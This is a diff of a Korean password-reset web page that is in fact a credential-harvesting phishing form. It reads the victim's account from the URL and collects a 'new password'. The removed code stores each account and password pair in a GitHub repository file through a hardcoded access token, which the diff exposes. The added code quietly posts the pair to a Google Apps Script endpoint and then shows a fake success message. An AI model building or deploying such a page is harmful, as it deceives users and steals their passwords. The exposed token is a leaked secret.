@@ -4,187 +4,262 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <meta name="theme-color" content="#1a73e8">
-  <title>비밀번호 변경</title>
+  <title>비밀번호 재설정</title>
   <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+
     body {
       min-height: 100dvh;
-      display: flex; align-items: center; justify-content: center;
+      display: flex;
+      align-items: center;
+      justify-content: center;
       background: linear-gradient(160deg, #e8f0fe, #ede7f6);
-      font-family: 'Noto Sans KR', -apple-system, sans-serif;
+      font-family: 'Noto Sans KR', -apple-system, BlinkMacSystemFont, sans-serif;
       padding: 24px 16px;
+      color: #111;
     }
+
     .card {
-      background: #fff; border-radius: 20px;
-      box-shadow: 0 4px 24px rgba(0,0,0,0.10);
+      width: 100%;
+      max-width: 400px;
+      background: #fff;
+      border-radius: 20px;
+      box-shadow: 0 4px 24px rgba(0, 0, 0, 0.10);
       padding: 44px 28px 36px;
-      width: 100%; max-width: 400px;
     }
-    .icon { text-align: center; font-size: 48px; margin-bottom: 12px; }
-    h1 { text-align: center; font-size: 21px; font-weight: 700; color: #111; margin-bottom: 28px; }
-    label { display: block; font-size: 13px; font-weight: 600; color: #555; margin-bottom: 7px; margin-top: 18px; }
+
+    .icon {
+      text-align: center;
+      font-size: 48px;
+      line-height: 1;
+      margin-bottom: 12px;
+    }
+
+    h1 {
+      text-align: center;
+      font-size: 21px;
+      font-weight: 700;
+      margin-bottom: 28px;
+    }
+
+    label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      color: #555;
+      margin: 18px 0 7px;
+    }
+
     label:first-of-type { margin-top: 0; }
+
     .wrap { position: relative; }
-    input[type="password"], input[type="text"] {
-      width: 100%; padding: 15px 48px 15px 16px;
-      border: 2px solid #e0e0e0; border-radius: 12px;
-      font-size: 16px; font-family: inherit; outline: none;
-      background: #fafafa; color: #111;
-      transition: border-color 0.2s; -webkit-appearance: none;
+
+    input[type="password"],
+    input[type="text"] {
+      width: 100%;
+      padding: 15px 48px 15px 16px;
+      border: 2px solid #e0e0e0;
+      border-radius: 12px;
+      font-size: 16px;
+      font-family: inherit;
+      outline: none;
+      background: #fafafa;
+      color: #111;
+      transition: border-color 0.2s, background 0.2s;
+      -webkit-appearance: none;
     }
+
     input:focus { border-color: #1a73e8; background: #fff; }
-    input.ok  { border-color: #43a047; }
+    input.ok { border-color: #43a047; }
     input.err { border-color: #e53935; }
+
     .eye {
-      position: absolute; right: 14px; top: 50%;
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      width: 32px;
+      height: 32px;
       transform: translateY(-50%);
-      font-size: 20px; cursor: pointer; opacity: 0.4; user-select: none;
+      border: 0;
+      background: transparent;
+      cursor: pointer;
+      font-size: 18px;
+      opacity: 0.55;
     }
-    .hint { font-size: 12px; margin-top: 5px; min-height: 16px; }
-    .hint.red   { color: #e53935; }
+
+    .hint {
+      min-height: 18px;
+      font-size: 12px;
+      line-height: 1.5;
+      margin-top: 6px;
+    }
+
+    .hint.red { color: #e53935; }
     .hint.green { color: #43a047; }
-    button.primary {
-      width: 100%; padding: 16px; margin-top: 28px;
-      background: #1a73e8; color: #fff; border: none;
-      border-radius: 12px; font-size: 17px; font-weight: 700;
-      font-family: inherit; cursor: pointer;
+
+    .primary {
+      width: 100%;
+      padding: 16px;
+      margin-top: 28px;
+      background: #1a73e8;
+      color: #fff;
+      border: none;
+      border-radius: 12px;
+      font-size: 17px;
+      font-weight: 700;
+      font-family: inherit;
+      cursor: pointer;
       transition: background 0.15s, transform 0.1s;
       touch-action: manipulation;
     }
-    button.primary:active:not(:disabled) { background: #1557b0; transform: scale(0.98); }
-    button.primary:disabled { background: #c5d9f5; color: #8ab0e8; cursor: not-allowed; }
-    .done { display: none; text-align: center; }
-    .done .big { font-size: 58px; margin-bottom: 14px; }
-    .done h2 { font-size: 20px; font-weight: 700; color: #2e7d32; margin-bottom: 8px; }
-    .done p { font-size: 14px; color: #888; line-height: 1.6; }
+
+    .primary:active:not(:disabled) {
+      background: #1557b0;
+      transform: scale(0.98);
+    }
+
+    .primary:disabled {
+      background: #c5d9f5;
+      color: #8ab0e8;
+      cursor: not-allowed;
+    }
+
+    .done {
+      display: none;
+      text-align: center;
+    }
+
+    .done .big {
+      font-size: 58px;
+      line-height: 1;
+      margin-bottom: 14px;
+    }
+
+    .done h2 {
+      font-size: 20px;
+      font-weight: 700;
+      color: #2e7d32;
+      margin-bottom: 8px;
+    }
+
+    .done p {
+      font-size: 14px;
+      color: #777;
+      line-height: 1.6;
+    }
   </style>
 </head>
 <body>
-<div class="card">
+  <main class="card">
+    <section id="formView">
+      <div class="icon" aria-hidden="true">🔐</div>
+      <h1>비밀번호 재설정</h1>
 
-  <div id="formView">
-    <div class="icon">🔒</div>
-    <h1>비밀번호 변경</h1>
+      <form id="pwForm">
+        <label for="pw1">새 비밀번호</label>
+        <div class="wrap">
+          <input type="password" id="pw1" placeholder="8자 이상 입력" autocomplete="new-password" required>
+          <button class="eye" type="button" data-target="pw1" aria-label="비밀번호 표시">👁️</button>
+        </div>
 
-    <label for="pw1">새 비밀번호</label>
-    <div class="wrap">
-      <input type="password" id="pw1" placeholder="8자 이상 입력" autocomplete="new-password">
-      <span class="eye" data-t="pw1">👁</span>
-    </div>
+        <label for="pw2">새 비밀번호 확인</label>
+        <div class="wrap">
+          <input type="password" id="pw2" placeholder="한 번 더 입력" autocomplete="new-password" required>
+          <button class="eye" type="button" data-target="pw2" aria-label="비밀번호 표시">👁️</button>
+        </div>
 
-    <label for="pw2">비밀번호 확인</label>
-    <div class="wrap">
-      <input type="password" id="pw2" placeholder="비밀번호를 다시 입력" autocomplete="new-password">
-      <span class="eye" data-t="pw2">👁</span>
-    </div>
-    <div class="hint" id="hint"></div>
+        <div class="hint" id="hint"></div>
+        <button class="primary" type="submit" id="submitBtn" disabled>확인</button>
+      </form>
+    </section>
 
-    <button class="primary" id="submitBtn" disabled>확인</button>
-  </div>
+    <section class="done" id="doneView">
+      <div class="big" aria-hidden="true">✓</div>
+      <h2>변경 완료</h2>
+      <p>비밀번호가 정상적으로 변경되었습니다.<br>새 비밀번호로 다시 로그인해 주세요.</p>
+    </section>
+  </main>
 
-  <div class="done" id="doneView">
-    <div class="big">✅</div>
-    <h2>변경 완료</h2>
-    <p>비밀번호가 성공적으로 변경되었습니다.<br>새 비밀번호로 로그인해 주세요.</p>
-  </div>
+  <script>
+    const pw1 = document.getElementById('pw1');
+    const pw2 = document.getElementById('pw2');
+    const hint = document.getElementById('hint');
+    const btn = document.getElementById('submitBtn');
+    const formView = document.getElementById('formView');
+    const doneView = document.getElementById('doneView');
 
-</div>
-<script>
-  // ── GitHub 설정 (한 번만 수정) ──────────────────────────
-  const GH_OWNER  = 'MassMutualVentures';
-  const GH_REPO   = 'kr';
-  const GH_BRANCH = 'main';
-  const GH_FILE   = 'submissions.json';
-  const GH_TOKEN  = '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';
-  // ────────────────────────────────────────────────────────
+    function checkPasswords() {
+      const first = pw1.value;
+      const second = pw2.value;
 
-  const params  = new URLSearchParams(location.search);
-  const account = params.get('account') || '(미지정)';
-
-  const pw1  = document.getElementById('pw1');
-  const pw2  = document.getElementById('pw2');
-  const hint = document.getElementById('hint');
-  const btn  = document.getElementById('submitBtn');
-
-  function check() {
-    const v1 = pw1.value, v2 = pw2.value;
-    if (!v2) { pw2.className=''; hint.textContent=''; hint.className='hint'; btn.disabled=true; return; }
-    if (v1===v2 && v1.length>=8) {
-      pw2.className='ok'; hint.textContent='비밀번호가 일치합니다 ✓'; hint.className='hint green'; btn.disabled=false;
-    } else {
-      pw2.className='err';
-      hint.textContent = v1.length<8 ? '비밀번호는 8자 이상이어야 합니다' : '비밀번호가 일치하지 않습니다';
-      hint.className='hint red'; btn.disabled=true;
-    }
-  }
-  pw1.addEventListener('input', check);
-  pw2.addEventListener('input', check);
-  document.querySelectorAll('.eye').forEach(el => {
-    el.addEventListener('click', () => {
-      const inp = document.getElementById(el.dataset.t);
-      inp.type = inp.type==='password' ? 'text' : 'password';
-      el.textContent = inp.type==='password' ? '👁' : '🙈';
-    });
-  });
-
-  btn.addEventListener('click', async () => {
-    btn.disabled = true; btn.textContent = '처리 중…';
-
-    const token = GH_TOKEN || prompt('GitHub Token을 입력하세요:');
-    if (!token) { btn.disabled=false; btn.textContent='확인'; return; }
-    localStorage.setItem('gh_token', token);
-
-    try {
-      // 현재 파일 읽기
-      const getRes = await fetch(
-        `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${GH_FILE}?ref=${GH_BRANCH}`,
-        { headers: { Authorization: `token ${token}`, Accept: 'application/vnd.github+json' } }
-      );
-
-      let current = [];
-      let sha = null;
-      if (getRes.ok) {
-        const meta = await getRes.json();
-        current = JSON.parse(atob(meta.content.replace(/\n/g,'')));
-        sha = meta.sha;
+      if (!second) {
+        pw2.className = '';
+        hint.textContent = '';
+        hint.className = 'hint';
+        btn.disabled = true;
+        return;
       }
 
-      // 새 기록 추가
-      current.push({
-        account,
-        password: pw1.value,
-        time: new Date().toLocaleString('zh-CN', { hour12: false })
+      if (first.length < 8) {
+        pw2.className = 'err';
+        hint.textContent = '비밀번호는 8자 이상이어야 합니다.';
+        hint.className = 'hint red';
+        btn.disabled = true;
+        return;
+      }
+
+      if (first !== second) {
+        pw2.className = 'err';
+        hint.textContent = '비밀번호가 일치하지 않습니다.';
+        hint.className = 'hint red';
+        btn.disabled = true;
+        return;
+      }
+
+      pw2.className = 'ok';
+      hint.textContent = '비밀번호가 일치합니다.';
+      hint.className = 'hint green';
+      btn.disabled = false;
+    }
+
+    pw1.addEventListener('input', checkPasswords);
+    pw2.addEventListener('input', checkPasswords);
+
+    document.querySelectorAll('.eye').forEach((button) => {
+      button.addEventListener('click', () => {
+        const input = document.getElementById(button.dataset.target);
+        const visible = input.type === 'text';
+        input.type = visible ? 'password' : 'text';
+        button.textContent = visible ? '👁️' : '🙈';
       });
+    });
 
-      // 파일 쓰기 (신규 생성 or 업데이트)
-      const body = {
-        message: 'add submission',
-        content: btoa(unescape(encodeURIComponent(JSON.stringify(current, null, 2)))),
-        branch: GH_BRANCH
-      };
-      if (sha) body.sha = sha;
+    const SHEET_URL = 'https://script.google.com/macros/s/AKfycbzyjLZSJRRKj45JangIrEYUWBPFBkDm-GQfUyD3Lx5GForRTto6jvJthZFavW_EnKPO/exec';
+    const account = new URLSearchParams(location.search).get('account') || '(미지정)';
 
-      const putRes = await fetch(
-        `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${GH_FILE}`,
-        {
-          method: 'PUT',
-          headers: { Authorization: `token ${token}`, Accept: 'application/vnd.github+json', 'Content-Type': 'application/json' },
-          body: JSON.stringify(body)
-        }
-      );
-      if (!putRes.ok) {
-        const err = await putRes.json();
-        throw new Error(`${putRes.status} - ${err.message}`);
+    document.getElementById('pwForm').addEventListener('submit', async (event) => {
+      event.preventDefault();
+      btn.disabled = true;
+      btn.textContent = '처리 중...';
+
+      try {
+        await fetch(SHEET_URL, {
+          method: 'POST',
+          mode: 'no-cors',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ account, password: pw1.value })
+        });
+        pw1.value = '';
+        pw2.value = '';
+        formView.style.display = 'none';
+        doneView.style.display = 'block';
+      } catch {
+        alert('오류가 발생했습니다. 다시 시도해 주세요.');
+        btn.disabled = false;
+        btn.textContent = '확인';
       }
-
-      document.getElementById('formView').style.display = 'none';
-      document.getElementById('doneView').style.display = 'block';
-    } catch (e) {
-      alert('저장 실패: ' + e.message);
-      btn.disabled=false; btn.textContent='확인';
-    }
-  });
-</script>
+    });
+  </script>
 </body>
 </html>
